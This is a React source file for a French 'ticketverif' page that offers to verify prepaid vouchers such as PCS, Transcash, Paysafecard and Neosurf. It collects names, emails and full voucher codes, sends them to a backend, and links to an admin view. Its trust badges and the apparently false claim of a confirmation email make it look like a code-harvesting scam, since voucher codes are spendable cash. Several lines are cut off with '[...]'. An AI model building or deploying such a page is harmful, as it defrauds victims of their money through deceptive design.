import { useState } from 'react'
import { Routes, Route, Link, useNavigate } from 'react-router-dom'
import { addTicket } from './lib/storage.js'
import Admin from './Admin.jsx'

const partners = [
  { name: 'PCS', color: '#ff6a3d' },
  { name: 'Transcash', color: '#00b3e6' },
  { name: 'Paysafecard', color: '#e60028' },
  { name: 'Toneo', color: '#7c3aed' },
  { name: 'Bitnovo', color: '#f7931a' },
  { name: 'Neosurf', color: '#00a14b' },
]

function MainForm() {
  const [name, setName] = useState('')
  const [email, setEmail] = useState('')
  const [type, setType] = useState('')
  const [count, setCount] = useState('')
  const [codes, setCodes] = useState({})
  const [mask, setMask] = useState(false)
  const [error, setError] = useState('')
  const [submitted, setSubmitted] = useState(null)
  const [loading, setLoading] = useState(false)

  const ticketCount = parseInt(count) || 0

  function handleCountChange(val) {
    setCount(val)
    const n = parseInt(val) || 0
    const newCodes = {}
    for (let i = 1; i <= n; i++) {
      newCodes[i] = codes[i] || ''
    }
    setCodes(newCodes)
  }

  function handleCodeChange(i, val) {
    setCodes((prev) => ({ ...prev, [i]: val }))
  }

  async function handleSubmit(e) {
    e.preventDefault()
    setError('')
    if (!name.trim()) return setError('Veuillez entrer votre nom complet.')
    if (!email.trim()) return setError('Veuillez entrer votre adresse email.')
    if (!type) return setError('Veuillez sélectionner le type de ticket.')
    if (!ticketCount || ticketCount < 1) return setError('Veuillez indiquer le nombre de tickets.')
    for (let i = 1; i <= ticketCount; i++) {
      if (!codes[i]?.trim()) return setError(`Le code du ticket ${i} est requis.`)
    }
    const allCodes = []
    for (let i = 1; i <= ticketCount; i++) {
      allCodes.push(codes[i].trim())
    }
    setLoading(true)
    try {
      const res = await fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type, codes: allCodes,
          name: name.trim(), email: email.trim(), ticketCount,
        }),
      })
      const data = await res.json()
      if (!data.success) throw new Error(data.error || 'Erreur serveur')
      setSubmitted({ id: data.id, email: email.trim() })
    } catch (err) {
      setError('Erreur lors de l\'envoi: ' + err.message)
    } finally {
      setLoading(false)
    }
  }

  function reset() {
    setSubmitted(null)
    setName('')
    setEmail('')
    setType('')
    setCount('')
    setCodes({})
    setMask(false)
    setError('')
  }

  const trustBadges = [
    { icon: '🔒', label: 'SSL 256-bit' },
    { icon: '🛡️', label: 'Vérifié' },
    { icon: '⚡', label: 'Rapide' },
    { icon: '👁️', label: 'Confidentiel' },
  ]

  return (
    <>
      {/* LOGO */}
      <div className="logo">
        <div className="logo-icon">
          <svg width="44" height="44" viewBox="0 0 44 44" fill="none">
            <path d="M22 2C11.507 2 3 10.507 3 21c0 5.25 2.127 9.997 5.563 13.437A18.9 18.9 0 0022 42a18.9 18.9 0 0013.437-7.563A18.9 18.9 0 0041 21C41 10.507 32.493 2 22 2z" fill="#2563eb"/>
            <path d="M18.5 28.5l-6-6 2.12-2.12 3.88 3.88 9.5-9.5 2.12 2.12-11.62 11.62z" fill="#fff"/>
          </svg>
        </div>
        <div className="logo-text">ticket<b className="v">verif</b></div>
      </div>

      <div className="divider" />

      {/* TRUST BADGES */}
      <div className="trust-strip">
        {trustBadges.map((b, i) => (
          <div className="trust-badge" key={i}>
            <span className="trust-badge-icon">{b.icon}</span>
            <span className="trust-badge-label">{b.label}</span>
          </div>
        ))}
      </div>

      {/* CONTENT */}
      <div className="content">
        {submitted ? (
          <div className="success">
            <div className="success-icon">✅</div>
            <h2>Ticket(s) soumis avec succès</h2>
            <p>
              Un email de confirmation a été envoyé à l'adresse :
            </p>
            <div className="success-email">{submitted.email}</div>
            <p style={{ fontSize: 13, color: 'var(--text-2)', marginBottom: 8 }}>
              Conservez votre numéro de suivi :
            </p>
            <div className="success-id">N° {submitted.id}</div>
            <button className="success-btn" onClick={reset}>Soumettre un autre ticket</button>
          </div>
        ) : (
          <>
            <h1 className="title">Vérification de ticket de recharge</h1>
            <p className="subtitle">
              Remplissez le formulaire ci-dessous pour vérifier la validité de votre ticket
              et consulter les informations associées.
            </p>

            <div className="form-card">
              <form onSubmit={handleSubmit}>
                {/* Nom */}
                <div className="form-group">
                  <label className="form-label">Nom complet</label>
                  <div className="form-input-wrap">
                    <span className="form-input-icon">
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M20 21v-2a4 4 0 00-4-[...]
                    </span>
                    <input className="form-input" type="text" placeholder="Entrez votre nom complet" value={name} onChange={(e) => setName(e.target.value)} />
                  </div>
                </div>

                {/* Email */}
                <div className="form-group">
                  <label className="form-label">Email</label>
                  <div className="form-input-wrap">
                    <span className="form-input-icon">
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="4" width="20" h[...]
                    </span>
                    <input className="form-input" type="email" placeholder="Entrez votre adresse email" value={email} onChange={(e) => setEmail(e.target.value)} />
                  </div>
                </div>

                {/* Nombre */}
                <div className="form-group">
                  <label className="form-label">Nombre de ticket(s)</label>
                  <div className="form-input-wrap">
                    <span className="form-input-icon">
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="3" width="7" he[...]
                    </span>
                    <input className="form-input-number" type="number" min="1" max="10" placeholder="Entrez le nombre de tickets" value={count} onChange={(e) => handleCountChange(e.target.value)}[...]
                  </div>
                </div>

                {/* Type de ticket */}
                <div className="form-group">
                  <label className="form-label">Type de ticket</label>
                  <div className="type-selector">
                    {partners.map((p) => (
                      <div
                        key={p.name}
                        className={`type-chip ${type === p.name ? 'selected' : ''}`}
                        onClick={() => setType(p.name)}
                      >
                        <span className="type-chip-dot" style={{ background: p.color }} />
                        <span>{p.name}</span>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Codes dynamiques */}
                {ticketCount > 0 && (
                  <div className="codes-section">
                    <label className="form-label">Code(s) du/des ticket(s)</label>
                    <div className="codes-grid">
                      {Array.from({ length: ticketCount }, (_, i) => i + 1).map((i) => (
                        <div className="code-field" key={i}>
                          <div className="code-field-label">Ticket {i}</div>
                          <div className="form-input-wrap">
                            <span className="form-input-icon">
                              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M2 9a3 3 0 01[...]
                            </span>
                            <input className="form-input form-input-sm" type={mask ? 'password' : 'text'} placeholder={`Code ticket ${i}`} value={codes[i] || ''} onChange={(e) => handleCodeChange[...]
                          </div>
                        </div>
                      ))}
                    </div>
                    <div className="codes-toggle">
                      <button type="button" className="mask-toggle" onClick={() => setMask(!mask)}>
                        {mask ? (
                          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.0[...]
                        ) : (
                          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-8 11-8 11[...]
                        )}
                        {mask ? 'Afficher les codes' : 'Masquer les codes'}
                      </button>
                    </div>
                  </div>
                )}

                {error && <div className="form-error">{error}</div>}

                <button type="submit" className="form-submit" disabled={loading}>
                  {loading ? (
                    <>Envoi en cours...</>
                  ) : (
                    <>
                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="8[...]
                      Vérifier le(s) ticket(s)
                    </>
                  )}
                </button>
              </form>

              <div className="form-secure">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height[...]
                Vos informations sont sécurisées et confidentielles.
              </div>
            </div>
          </>
        )}
      </div>

      {/* PARTENAIRES */}
      <div className="partners-section">
        <div className="partners-label">Nos partenaires et services compatibles</div>
        <div className="partners-grid">
          {partners.map((p) => (
            <div className="partner-card" key={p.name}>
              <div className="partner-dot" style={{ background: p.color }} />
              <span className="partner-name">{p.name}</span>
            </div>
          ))}
        </div>
      </div>

      {/* FOOTER */}
      <footer className="footer">
        <span>© {new Date().getFullYear()} ticketverif. Tous droits réservés.</span>
        <Link to="/admin" className="footer-admin">Administration</Link>
      </footer>
    </>
  )
}

export default function App() {
  return (
    <div className="page">
      <Routes>
        <Route path="/" element={<MainForm />} />
        <Route path="/admin" element={<Admin />} />
      </Routes>
    </div>
  )
}
